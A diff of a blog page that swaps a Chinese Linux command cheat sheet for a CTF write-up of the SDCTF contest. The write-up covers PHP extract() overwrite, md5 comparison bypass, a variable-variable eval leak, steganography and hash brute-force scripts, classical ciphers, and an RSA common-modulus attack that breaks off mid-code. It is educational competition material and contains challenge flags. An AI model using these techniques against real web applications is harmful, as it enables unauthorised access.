@@ -43,9 +43,9 @@
     
     <title>
         
-            Linux | 
+            SDCTF | 
         
-        Righteous
+        Righteous&#39;Blog
     </title>
 
     <!-- Favicons -->
@@ -53,10 +53,15 @@
     <link rel="icon" href="/img/favicon.png">
 
     <meta name="format-detection" content="telephone=no"/>
-    <meta name="description" itemprop="description" content="帮助man #获取相关命令的帮助信息
-info #获取相关命令的详细使用方法
+    <meta name="description" itemprop="description" content="Webweb100 查看源码，发现extract函数，提交覆盖
+SDPC ==&amp;gt;aaaaa&amp;lt;br&amp;gt;password ==&amp;gt;sdpcsdpcsdpc&amp;lt;br&amp;gt;&amp;lt;!--
+ if ($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;) {?&amp;gt;
+     extract($_POST);
+ if ($SDPC == $password) { 
+     echo $key;
+--&amp;gt;
 ">
-    <meta name="keywords" content=",Linux">
+    <meta name="keywords" content=",CTF,Writeup">
     <meta name="theme-color" content="#0097A7">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -216,11 +221,11 @@ info #获取相关命令的详细使用方法
 
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
-    <meta name="application-name" content="Righteous">
-    <meta name="msapplication-starturl" content="http://righte0us.cc/2017/06/01/Linux/">
+    <meta name="application-name" content="Righteous&#39;Blog">
+    <meta name="msapplication-starturl" content="http://blog.righte0us.cc/archives/SDCTF.righte0us">
     <meta name="msapplication-navbutton-color" content="#0097A7">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-title" content="Righteous">
+    <meta name="apple-mobile-web-app-title" content="Righteous&#39;Blog">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
     <link rel="apple-touch-icon" href="/img/favicon.png">
 
@@ -232,18 +237,23 @@ info #获取相关命令的详细使用方法
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://righte0us.cc/2017/06/01/Linux/">
+    <meta property="og:url" content="http://blog.righte0us.cc/archives/SDCTF.righte0us">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Linux | Righteous">
+    <meta property="og:title" content="SDCTF | Righteous&#39;Blog">
     <meta property="og:image" content="/img/favicon.png">
-    <meta property="og:description" content="帮助man #获取相关命令的帮助信息
-info #获取相关命令的详细使用方法
+    <meta property="og:description" content="Webweb100 查看源码，发现extract函数，提交覆盖
+SDPC ==&amp;gt;aaaaa&amp;lt;br&amp;gt;password ==&amp;gt;sdpcsdpcsdpc&amp;lt;br&amp;gt;&amp;lt;!--
+ if ($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;) {?&amp;gt;
+     extract($_POST);
+ if ($SDPC == $password) { 
+     echo $key;
+--&amp;gt;
 ">
-    <meta property="og:article:tag" content="Linux"> 
+    <meta property="og:article:tag" content="CTF"> <meta property="og:article:tag" content="Writeup"> 
 
     
-        <meta property="article:published_time" content="Thu Jun 01 2017 13:47:39 GMT+0800">
-        <meta property="article:modified_time" content="Fri Dec 08 2017 19:32:08 GMT+0800">
+        <meta property="article:published_time" content="Sat Apr 08 2017 13:31:48 GMT+0800">
+        <meta property="article:modified_time" content="Fri Dec 08 2017 19:36:00 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -251,7 +261,7 @@ info #获取相关命令的详细使用方法
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://righte0us.cc/2017/06/01/Linux/index.html" />
+        <link rel="canonical" href="http://blog.righte0us.cc/archives/SDCTF.righte0us" />
     
 
     <!-- Structured-data for SEO -->
@@ -263,10 +273,10 @@ info #获取相关命令的详细使用方法
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://righte0us.cc/2017/06/01/Linux/index.html",
-    "headline": "Linux",
-    "datePublished": "Thu Jun 01 2017 13:47:39 GMT+0800",
-    "dateModified": "Fri Dec 08 2017 19:32:08 GMT+0800",
+    "mainEntityOfPage": "http://blog.righte0us.cc/archives/SDCTF.righte0us",
+    "headline": "SDCTF",
+    "datePublished": "Sat Apr 08 2017 13:31:48 GMT+0800",
+    "dateModified": "Fri Dec 08 2017 19:36:00 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "Righteous",
@@ -278,15 +288,20 @@ info #获取相关命令的详细使用方法
     },
     "publisher": {
         "@type": "Organization",
-        "name": "Righteous",
+        "name": "Righteous&#39;Blog",
         "logo": {
             "@type":"ImageObject",
             "url": "/img/favicon.png"
         }
     },
-    "keywords": ",Linux",
-    "description": "帮助man #获取相关命令的帮助信息
-info #获取相关命令的详细使用方法
+    "keywords": ",CTF,Writeup",
+    "description": "Webweb100 查看源码，发现extract函数，提交覆盖
+SDPC ==&amp;gt;aaaaa&amp;lt;br&amp;gt;password ==&amp;gt;sdpcsdpcsdpc&amp;lt;br&amp;gt;&amp;lt;!--
+ if ($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;) {?&amp;gt;
+     extract($_POST);
+ if ($SDPC == $password) { 
+     echo $key;
+--&amp;gt;
 ",
 }
 </script>
@@ -352,7 +367,7 @@ info #获取相关命令的详细使用方法
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#帮助"><span class="post-toc-number">1.</span> <span class="post-toc-text"><a href="#&#x5E2E;&#x52A9;" class="headerlink" title="&#x5E2E;&#x52A9;"></a>&#x5E2E;&#x52A9;</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#文件管理"><span class="post-toc-number">2.</span> <span class="post-toc-text"><a href="#&#x6587;&#x4EF6;&#x7BA1;&#x7406;" class="headerlink" title="&#x6587;&#x4EF6;&#x7BA1;&#x7406;"></a>&#x6587;&#x4EF6;&#x7BA1;&#x7406;</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本文件操作"><span class="post-toc-number">2.1.</span> <span class="post-toc-text"><a href="#&#x57FA;&#x672C;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;" class="headerlink" title="&#x57FA;&#x672C;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;"></a>&#x57FA;&#x672C;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#修"><span class="post-toc-number">2.2.</span> <span class="post-toc-text"><a href="#&#x4FEE;" class="headerlink" title="&#x4FEE;"></a>&#x4FEE;</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查"><span class="post-toc-number">2.3.</span> <span class="post-toc-text"><a href="#&#x67E5;" class="headerlink" title="&#x67E5;"></a>&#x67E5;</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#其他基本操作"><span class="post-toc-number">2.4.</span> <span class="post-toc-text"><a href="#&#x5176;&#x4ED6;&#x57FA;&#x672C;&#x64CD;&#x4F5C;" class="headerlink" title="&#x5176;&#x4ED6;&#x57FA;&#x672C;&#x64CD;&#x4F5C;"></a>&#x5176;&#x4ED6;&#x57FA;&#x672C;&#x64CD;&#x4F5C;</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#杂"><span class="post-toc-number">2.5.</span> <span class="post-toc-text"><a href="#&#x6742;" class="headerlink" title="&#x6742;"></a>&#x6742;</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#可执行文件操作"><span class="post-toc-number">2.6.</span> <span class="post-toc-text"><a href="#&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;" class="headerlink" title="&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;"></a>&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#用户"><span class="post-toc-number">2.7.</span> <span class="post-toc-text"><a href="#&#x7528;&#x6237;" class="headerlink" title="&#x7528;&#x6237;"></a>&#x7528;&#x6237;</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#网络管理"><span class="post-toc-number">2.8.</span> <span class="post-toc-text"><a href="#&#x7F51;&#x7EDC;&#x7BA1;&#x7406;" class="headerlink" title="&#x7F51;&#x7EDC;&#x7BA1;&#x7406;"></a>&#x7F51;&#x7EDC;&#x7BA1;&#x7406;</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#磁盘管理"><span class="post-toc-number">2.9.</span> <span class="post-toc-text"><a href="#&#x78C1;&#x76D8;&#x7BA1;&#x7406;" class="headerlink" title="&#x78C1;&#x76D8;&#x7BA1;&#x7406;"></a>&#x78C1;&#x76D8;&#x7BA1;&#x7406;</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#系统管理"><span class="post-toc-number">2.10.</span> <span class="post-toc-text"><a href="#&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;" class="headerlink" title="&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;"></a>&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#服务"><span class="post-toc-number">2.11.</span> <span class="post-toc-text"><a href="#&#x670D;&#x52A1;" class="headerlink" title="&#x670D;&#x52A1;"></a>&#x670D;&#x52A1;</span></a></li></ol></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web"><span class="post-toc-number">1.</span> <span class="post-toc-text"><a href="#Web" class="headerlink" title="Web"></a>Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web100"><span class="post-toc-number">1.1.</span> <span class="post-toc-text"><a href="#web100" class="headerlink" title="web100"></a>web100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web300"><span class="post-toc-number">1.2.</span> <span class="post-toc-text"><a href="#web300" class="headerlink" title="web300"></a>web300</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web400"><span class="post-toc-number">1.3.</span> <span class="post-toc-text"><a href="#web400" class="headerlink" title="web400"></a>web400</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Misc"><span class="post-toc-number">2.</span> <span class="post-toc-text"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc200"><span class="post-toc-number">2.1.</span> <span class="post-toc-text"><a href="#Misc200" class="headerlink" title="Misc200"></a>Misc200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Mice200-Combine"><span class="post-toc-number">2.2.</span> <span class="post-toc-text"><a href="#Mice200-Combine" class="headerlink" title="Mice200(Combine)"></a>Mice200(Combine)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc300"><span class="post-toc-number">2.3.</span> <span class="post-toc-text"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc500-MP3stego"><span class="post-toc-number">2.4.</span> <span class="post-toc-text"><a href="#Misc500-MP3stego" class="headerlink" title="Misc500(MP3stego)"></a>Misc500(MP3stego)</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Crypto"><span class="post-toc-number">3.</span> <span class="post-toc-text"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Crypto200-Knock"><span class="post-toc-number">3.1.</span> <span class="post-toc-text"><a href="#Crypto200-Knock" class="headerlink" title="Crypto200(Knock)"></a>Crypto200(Knock)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Crypto300-MD5"><span class="post-toc-number">3.2.</span> <span class="post-toc-text"><a href="#Crypto300-MD5" class="headerlink" title="Crypto300(MD5)"></a>Crypto300(MD5)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Crypto500-RSA"><span class="post-toc-number">3.3.</span> <span class="post-toc-text"><a href="#Crypto500-RSA" class="headerlink" title="Crypto500(RSA)"></a>Crypto500(RSA)</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Bin"><span class="post-toc-number">4.</span> <span class="post-toc-text"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Bin300-RC4"><span class="post-toc-number">4.1.</span> <span class="post-toc-text"><a href="#Bin300-RC4" class="headerlink" title="Bin300(RC4)"></a>Bin300(RC4)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Bin500-PwnPwnPwn"><span class="post-toc-number">4.2.</span> <span class="post-toc-text"><a href="#Bin500-PwnPwnPwn" class="headerlink" title="Bin500(PwnPwnPwn)"></a>Bin500(PwnPwnPwn)</span></a></li></ol></li></ol>
     </ul>
     
 
@@ -384,7 +399,7 @@ info #获取相关命令的详细使用方法
         
     
             <p class="article-headline-p">
-                Linux
+                SDCTF
             </p>
         </div>
 
@@ -403,7 +418,7 @@ info #获取相关命令的详细使用方法
     <!-- Author Name & Date -->
     <div>
         <strong>Righteous</strong>
-        <span>6月 01, 2017</span>
+        <span>4月 08, 2017</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -427,7 +442,7 @@ info #获取相关命令的详细使用方法
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/Linux/">Linux</a>
+        <a class="post_tag-link" href="/tags/CTF/">CTF</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/Writeup/">Writeup</a>
     </ul>
     
 
@@ -462,7 +477,7 @@ info #获取相关命令的详细使用方法
 
     <!-- Share Telegram -->
     
-        <a class="post_share-link" href="https://telegram.me/share/url?url=http://righte0us.cc/2017/06/01/Linux/index.html&text=Linux" target="_blank">
+        <a class="post_share-link" href="https://telegram.me/share/url?url=http://blog.righte0us.cc/archives/SDCTF.righte0us&text=SDCTF" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Telegram
             </li>
@@ -478,204 +493,262 @@ info #获取相关命令的详细使用方法
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h1 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h1><pre><code>man #获取相关命令的帮助信息
-info #获取相关命令的详细使用方法
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p> 查看源码，发现extract函数，提交覆盖</p>
+<pre><code>SDPC ==&gt;aaaaa&lt;br&gt;password ==&gt;sdpcsdpcsdpc&lt;br&gt;&lt;!--
+ if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {?&gt;
+     extract($_POST);
+ if ($SDPC == $password) { 
+     echo $key;
+--&gt;
 </code></pre><a id="more"></a>
-<h1 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h1><h2 id="基本文件操作"><a href="#基本文件操作" class="headerlink" title="基本文件操作"></a>基本文件操作</h2><p><strong>增</strong></p>
-<pre><code>touch file #创建文件
-</code></pre><p><strong>删</strong></p>
-<pre><code>rm option file
--r 即recursive，递归删除
--f 即force，强制删除
-</code></pre><h2 id="修"><a href="#修" class="headerlink" title="修"></a>修</h2><p><strong>修改位置</strong></p>
-<pre><code>mv
-</code></pre><p><strong>修改权限</strong></p>
-<pre><code>ln
-</code></pre><p><strong>修改文件所属者以及文件所属用户组</strong></p>
-<pre><code>chown
-</code></pre><p><strong>修改属性</strong></p>
-<pre><code>chmod
-</code></pre><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><p><strong>查看文件类型</strong></p>
-<pre><code>file
-</code></pre><p><strong>查看内容</strong></p>
-<pre><code>ls
-cat
-more #在终端屏幕上按帧显示文件
-less #按页显示文件
-head #显示文件的前几行
-tail #显示之地你个文件的最后部分
-strings
-</code></pre><p><strong>查找位置</strong></p>
-<pre><code>whereis
-locate
-find
-</code></pre><p><strong>查找内容</strong></p>
-<pre><code>grep #安给定模式搜索文件内容
-</code></pre><p><strong>查看区别</strong></p>
-<pre><code>diff #查看两个文本文件的区别，列出行不同之处
-</code></pre><p><strong>查其他</strong></p>
-<pre><code>wc #显示指定文件的行数，词数或字符数
-</code></pre><h2 id="其他基本操作"><a href="#其他基本操作" class="headerlink" title="其他基本操作"></a>其他基本操作</h2><p><strong>备份与恢复</strong></p>
-<pre><code>cp
-cpio
-dump #备份文件系统
-restore #还原由dump所备份下来的文件或者整个文件系统
-</code></pre><p><strong>压缩解压缩</strong></p>
-<pre><code>gzip/gunzip #.gz文件的压缩/解压缩程序
-gzexe #压缩可执行文件
-tar #将若干文件存档或读取存档文件
-unarj #解压缩.arj文件
-zip/unzip #压缩解压缩zip文件
-zipinfo #列出zip压缩文件的详细信息
-bzip2/bunzip2 #压缩解压缩.bz2文件
-</code></pre><h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><pre><code>dd #从指定文件读取数据写到指定文件
-ln # 建立文件链接
-sort # 对指定文件按行进行排序
-tr # 转换字符
-</code></pre><h2 id="可执行文件操作"><a href="#可执行文件操作" class="headerlink" title="可执行文件操作"></a>可执行文件操作</h2><p><strong>链接</strong></p>
-<pre><code>ldd file #查看可执行文件连接了哪些动态链接库
-</code></pre><p><strong>符号表</strong></p>
-<pre><code>nm file #查看可执行文件里有哪些符号
-strip #去除可执行文件里的符号表，减小文件体积
-</code></pre><p><strong>文件基本结构</strong></p>
-<pre><code>readelf
-</code></pre><p><strong>反汇编</strong></p>
-<pre><code>objdump
-</code></pre><p><strong>进程管理</strong></p>
-<pre><code># 进程查看
-ps -ef # 查看所有进程的详细信息
-# 杀死进程
-kill
-# 显示管理执行中的程序
-top
-</code></pre><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p><strong>查看用户信息</strong></p>
-<pre><code># 查看用户标识
-id
-# 显示目前注册的用户以及用户正运行的命令
-w
-# 列出当前用户登录的信息
-last
-# 查看系统用户
-rhwo
-# 查找并显示用户信息
-finger
-</code></pre><p><strong>修改用户信息</strong></p>
-<pre><code># 添加用户
-useradd
-# 删除用户
-userdel
-# 修改密码
-passwd
-userinfo #图形界面的修改工具
-usermod #修改用户属性，包括用户的shell类型，用户组等，甚至还能改登录名
-</code></pre><p><strong>修改用户权限</strong></p>
-<pre><code>su
-</code></pre><p><strong>用户登录</strong></p>
-<pre><code># 远程登入
-rlogin
-# 退出系统
-logout
-</code></pre><h2 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h2><p><strong>基本网络信息</strong></p>
-<pre><code>ifconfig
-#防火墙相关
-iptables -L #查看防火墙设置
-arp
-#路由信息
-route -n #查看路由表
-#查看与某主机是否联通
-ping
-#查看到某一个主机的路由路径
-traceroute
-#查看计算机名
-hostname
-#查看主机标识
-hostid
-#显示网络连接、路由表和网络接口信息
-netstat -lntp #查看所有监听的端口
-netstat -antp #查看所有已经建立的链接
-netstat -s #查看网络统计信息
-</code></pre><p><strong>文件传输</strong></p>
-<pre><code>#文件传输
-ftp
-#文件传输
-lftp
-#文件传输
-ncftp
-</code></pre><p><strong>网络浏览与下载</strong></p>
-<pre><code>#从网络自动下载文件
-wget
-curl
-</code></pre><p><strong>邮件管理</strong></p>
-<pre><code>#发送和接收电子邮件
-mail
-</code></pre><p><strong>远程通信</strong></p>
-<pre><code>telnet
-nc
-#安全模式下的远程登录
-ssh
-</code></pre><p><strong>用户通信</strong></p>
-<pre><code>#与主机另一用户通话
-talk
-#向其他用户的终端写信息
-write
-</code></pre><h2 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h2><p><strong>磁盘查看</strong></p>
-<pre><code># 当前工作目录
-pwd
-# 查看当前目录
-ls
-# 树状列出当前目录
-tree
-# 目录或文件大小
-du
-# 磁盘相关信息
-df -h # 查看各分区使用情况
-# 磁盘已使用空间及限制
-quota
-</code></pre><p><strong>磁盘操作</strong></p>
-<pre><code># 目录切换
-cd
-# 目录创建
-mkdir
-# 对磁盘进行分区
-fdisk -l # 查看所有分区
-# 挂载或者卸载文件系统
-mount/umount
-# 将内存缓冲区内的数据写入磁盘
-sync
-</code></pre><h2 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h2><p><strong>基本操作</strong></p>
-<pre><code># 显示系统信息
-uname -a # 查看系统内核、操作系统、CPU信息
-# 显示开机信息
-dmesg
-# 关机
-shutdown
-# 重启
-reboot
-# 退出当前shell
-exit
-</code></pre><p><strong>环境变量</strong></p>
-<pre><code># 设置或者显示环境变量
-export
-import
-# 查看环境变量
-env
-</code></pre><p><strong>指令</strong></p>
-<pre><code># 设置指令的别名
-alias
-</code></pre><p><strong>时间</strong></p>
-<pre><code># 调整RTC的时间
-clock
-# 设置或者显示系统的时间和日期
-date
-</code></pre><p><strong>内存</strong></p>
-<pre><code># 显示内存状态
-free -m # 按单位为M查看内存和交换区状态，默认单位为字节
-</code></pre><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p><strong>模块</strong></p>
-<pre><code># 显示已载入系统的模块
-lsmod
-# 自动处理可载入的模块
-modprobe
-</code></pre>
+<p><img src="/images/sdctf/1.png" alt=""></p>
+<p>Flag:SDCTF{244fcba2093a5c942ee11f0f3f28f21f}</p>
+<h2 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h2><p> 发现.git,访问发现aaa.php</p>
+<p><img src="/images/sdctf/2.png" alt=""></p>
+<pre><code>if (isset($_GET[&#39;a&#39;]) and isset($_GET[&#39;b&#39;])) { 
+   if ($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;]) 
+      if (md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) 
+         die(&#39;Flag: &#39;.$flag); 
+      else 
+         print &#39;Wrong.&#39;; }
+</code></pre><p><img src="/images/sdctf/3.png" alt=""><br>Flag: SDCTF{44224d27bfe875886f4b7247e16e48f8}</p>
+<h2 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h2><p>打开题目我们直接就看到源码，加上注释如下</p>
+<pre><code>&lt;?php
+$SDPC = @$_REQUEST[&#39;hello&#39;];     //$SDPC这个变量请求变量hello的值
+if(!preg_match(&#39;/^\w*$/&#39;,$SDPC )){ //正则表达式，匹配字符串，\w表示字符+数字+下划线，*代表有若干个\w字符  组成。
+die(&#39;ERROR&#39;);//不匹配则输出ERROR
+}
+eval(&quot;var_dump($$SDPC);&quot;);       //如果匹配输出\$\$SDPC的值
+</code></pre><p>而且通过题目链接可以知道hello变量一定是6位的，一开始真以为是爆破了，但是一想肯定很大，不可能。而且我们发现 $$a 这个东西很诡异。其实就是PHP中变量可以当作另一个变量的变量名。例如</p>
+<pre><code>&lt;?php
+ $a=&#39;b&#39;;
+ $b=&quot;hello world!&quot;;
+ eval(&quot;var_dump($$a);&quot;);
+?&gt;
+</code></pre><p>上面代码会输出hello world!<br>PHP一个比较有意思的变量!$GLOBALS：一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br>于是我们在url上构造/?hello=GLOBALS<br><img src="/images/sdctf/4.png" alt=""><br>Flag:SDCTF{f60eeabd0af6a908512983d844c00523}</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc200"><a href="#Misc200" class="headerlink" title="Misc200"></a>Misc200</h2><p>通过即得flag<br><img src="/images/sdctf/5.png" alt=""><br>修改存档</p>
+<p><img src="/images/sdctf/6.png" alt=""></p>
+<p><img src="/images/sdctf/7.png" alt=""></p>
+<h2 id="Mice200-Combine"><a href="#Mice200-Combine" class="headerlink" title="Mice200(Combine)"></a>Mice200(Combine)</h2><p>将下载的zip文件进行解压，里面有32个小文件，每个文件中是一个数字，给人感觉就是这个是ASCII值。将所有文件中的文本按照1，10，11，12……的顺序合并到一个文件中：</p>
+<pre><code>cat crypto2/* &gt; 1.txt
+</code></pre><p>然后转换成对应字符串:</p>
+<p><img src="/images/sdctf/8.png" alt=""> </p>
+<p>Flag:SDCTF{c5d3effc5u7bedw217e7ndPecf60b5}</p>
+<h2 id="Misc300"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</h2><p>rar爆破(pass:0522)，得到1.jpg，steghide隐写，解之得到FLAG.txt</p>
+<p><img src="/images/sdctf/9.png" alt=""></p>
+<p>Flag:SDCTF{25861b2471456810bea272fd666a8b79}</p>
+<h2 id="Misc500-MP3stego"><a href="#Misc500-MP3stego" class="headerlink" title="Misc500(MP3stego)"></a>Misc500(MP3stego)</h2><p>根据RGB生成二维码</p>
+<pre><code>from PIL import Image
+
+x = 280
+y = 280
+
+f = open(&quot;QR.txt&quot;,&#39;r&#39;)
+rgbinfo = f.readlines()
+f.close()
+c = Image.new(&quot;RGB&quot;,(x,y))
+
+for i in range(0,x):
+   for j in range(0,y):
+      rgb = rgbinfo[i * y + j].split(&quot;,&quot;)
+      c.putpixel([i, j],(int(rgb[0]), int(rgb[1]),int(rgb[2])))
+c.show()
+</code></pre><p>得到：MP3stego的密码在1000-1300之间。</p>
+<p>生成字典</p>
+<pre><code>f =open(&#39;pwd.txt&#39;,&#39;a&#39;)
+line = &#39;&#39;
+for i in xrange(1000,1300):
+  f.write(line+str(i)+&#39;\n&#39;)
+f.close()
+</code></pre><p>循环爆破</p>
+<pre><code>import os
+import subprocess
+for a in open(&#39;pwd.txt&#39;):
+   command=&#39;decode -X -P %s mp3.mp3&#39; % a.strip()
+   print command
+   p=subprocess.Popen(command,stdin=subprocess.PIPE,
+   stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
+   if &quot;unexpected end of cipher message.&quot;not in p.communicate()[1]:
+      print &#39;[&gt;]password is find:%s&#39; %a.strip()
+      print command
+      flag = open(&#39;mp3.mp3.txt&#39;)
+      print flag.read()
+      break
+</code></pre><p><img src="/images/sdctf/10.png" alt=""><br>Flag:flag{Brute_f0Rce_iS_W0nderful}</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto200-Knock"><a href="#Crypto200-Knock" class="headerlink" title="Crypto200(Knock)"></a>Crypto200(Knock)</h2><p>text文件中数字替换为英文字母得：zjqzhexjzmooqrssaidaiynlebnzjovosltahzjerhorrqxoeironlobdozavoouzjovosqfqsltahmqnqrrjotoerzjohorrqxoebooqydrztyqqojolx</p>
+<p>与knock文件中…._…替换：<br>zjqz_hexjz_mo_oqrs_sai_daiyn_lebn_zjo_vos_ltah_zjer_horrqxo_e_iron_lobdo_za_voou_zjo_vos_qfqs_ltah_mqn_qrr_joto_er_zjo_horrqxo_ebooqydrztyqqojolx</p>
+<p>在线解密（<a href="http://quipqiup.com/）" target="_blank" rel="noopener">http://quipqiup.com/）</a><br><img src="/images/sdctf/11.png" alt=""></p>
+<p>that_might_be_easy_you_could_find_the_key_from_this_message_i_used_fence_to_keep_the_key_away_from_bad_ass_here_is_the_message_ineealcstrlaaehefg</p>
+<p>ineealcstrlaaehefg，测试发现是栅栏加密，解出来得到icanseetherealflag<br>flag为SDCTF{md5(icanseetherealflag)}<br>Flag:SDCTF{ad0fe582c45dc970bfa9d6815d79684d}</p>
+<h2 id="Crypto300-MD5"><a href="#Crypto300-MD5" class="headerlink" title="Crypto300(MD5)"></a>Crypto300(MD5)</h2><p>发现第51个文件大小异常，提取，hex中补全PNG文件头，得到：</p>
+<p><img src="/images/sdctf/12.png" alt=""></p>
+<p>MD5爆破即可</p>
+<pre><code>import hashlib
+
+x = range(97,122)
+for a in x:
+    for b in x:
+        for c in x:
+            for d in x:
+                 for e in x:
+                     m = hashlib.md5()
+                     flag = &quot;SDCTF{a95&quot;+chr(a)+&quot;0b39186&quot;+chr(b)+&quot;887&quot;+chr(c)+&quot;949f87&quot;+chr(d)+&quot;20b44b&quot;+chr(e)+&quot;b5&quot;+&quot;}&quot;
+                         m.update(flag)
+                         n= m.hexdigest()
+                         n0 = list(n)
+                         if n0[0]==&#39;9&#39;:
+                           if n0[1]==&#39;5&#39;:
+                             if n0[2]==&#39;d&#39;:
+                               if n0[3]==&#39;c&#39;:
+                                 if n0[7]==&#39;8&#39;:
+                                   if n0[30]==&#39;a&#39;:
+                                      if n0[31]==&#39;3&#39;:
+                                        print n0
+                                        print flag
+</code></pre><p>Flag:SDCTF{a95a0b39186f887b949f87f20b44bdb5}</p>
+<h2 id="Crypto500-RSA"><a href="#Crypto500-RSA" class="headerlink" title="Crypto500(RSA)"></a>Crypto500(RSA)</h2><p>分析加密脚本，使用了相同的N,不同的e,加密相同的数据,且两个加密指数互素，可以通过共模攻击在两个密文和公钥被嗅探的情况下还原出明文m的值</p>
+<p>两个加密指数互质(e1,e2)=1,即存在s1,s2使得s1e1+s2e2=1<br>c1 ≡ me1 mod n<br>c2 ≡ me2 mod n<br>即 c1s1 c2s2 ≡ m mod n</p>
+<pre><code>from libnum import n2s,s2n
+from gmpy2 import invert
